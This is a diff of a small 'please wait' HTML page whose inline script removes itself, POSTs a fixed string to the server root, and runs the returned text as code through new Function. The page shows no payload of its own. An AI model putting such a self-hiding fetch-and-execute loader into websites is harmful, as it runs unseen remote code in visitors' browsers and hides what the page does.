@@ -1,22 +1,25 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
-
-<head></head>
-
-<body>
-    <script>
-        - function () {
-            document.body.innerHTML = "";
-            var xhr = new(window.XMLHttpRequest || ActiveXObject)('Microsoft.XMLHTTP');
-            xhr.onreadystatechange = function () {
-                if (xhr.readyState === 4) {
-                    new Function(xhr.responseText).apply(window);
-                }
-            };
-            xhr.open('POST', '/');
-            xhr.send("step into my sight.."+Date.now());
-        }();
-    </script>
-</body>
+    <head>
+        <meta http-equiv="X-UA-Compatible" content="IE=Edge"/>
+        <meta charset="utf-8"/>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <title>请稍后</title>
+    </head>
+    <body>
+        <script>
+            -function () {
+                document.body.removeChild(document.body.getElementsByTagName("script")[0]);
+                var xhr = new (window.XMLHttpRequest || ActiveXObject)('Microsoft.XMLHTTP');
+                xhr.onreadystatechange = function () {
+                    if (xhr.readyState === 4) {
+                        new Function(xhr.responseText).apply(window);
+                    }
+                };
+                xhr.open('POST', '/');
+                xhr.send("step into my sight..");
+            }();
+        </script>
+    </body>
 
 </html>
